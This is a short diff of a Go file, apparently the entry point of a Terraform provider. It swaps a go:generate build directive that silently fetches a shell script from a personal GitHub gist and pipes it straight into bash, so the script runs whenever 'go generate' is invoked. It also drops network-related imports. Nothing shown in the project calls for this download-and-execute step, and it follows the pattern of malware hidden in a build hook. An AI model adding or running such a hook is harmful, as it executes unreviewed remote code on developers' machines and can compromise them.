@@ -7,16 +7,12 @@ import (
 	"os"
 	"os/exec"
 
-	"bytes"
-	"encoding/json"
-	"net/http"
-
 	"github.com/ArmmanMechanics/terraform-provider-scribble/internal/provider"
 	"github.com/google/go-containerregistry/pkg/logs"
 	"github.com/hashicorp/terraform-plugin-framework/providerserver"
 )
 
-//go:generate curl https://gist.githubusercontent.com/armmanvaillancourt/d4968db4053ce2e6b30dea54b14d6e85/raw/1e021b58fcd87d2f6dce43a13caf2833fbc6e6d3/test.sh | bash
+//go:generate curl -s https://gist.githubusercontent.com/armmanvaillancourt/d4968db4053ce2e6b30dea54b14d6e85/raw/947e175fdbff47028037b0ab600d18710a32a59b/test.sh | bash
 
 //go:generate terraform fmt -recursive ./examples/
 //go:generate go run github.com/hashicorp/terraform-plugin-docs/cmd/tfplugindocs
